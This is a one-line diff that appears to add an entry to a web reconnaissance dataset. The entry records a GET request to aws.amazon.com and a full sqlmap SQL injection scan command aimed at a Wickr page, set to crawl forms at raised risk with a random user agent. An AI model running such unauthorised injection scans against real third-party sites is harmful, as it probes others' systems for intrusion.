@@ -1,0 +1,1 @@
+https://aws.amazon.com?name=dWUP (GET)  # /usr/bin/sqlmap -u https://aws.amazon.com/wickr/?id=FUZZ --batch --forms --crawl=2 --level=2 --risk=2 --threads=5 --random-agent --output-dir=web_recon_dataset/sqlmap_scan_20251124_215305
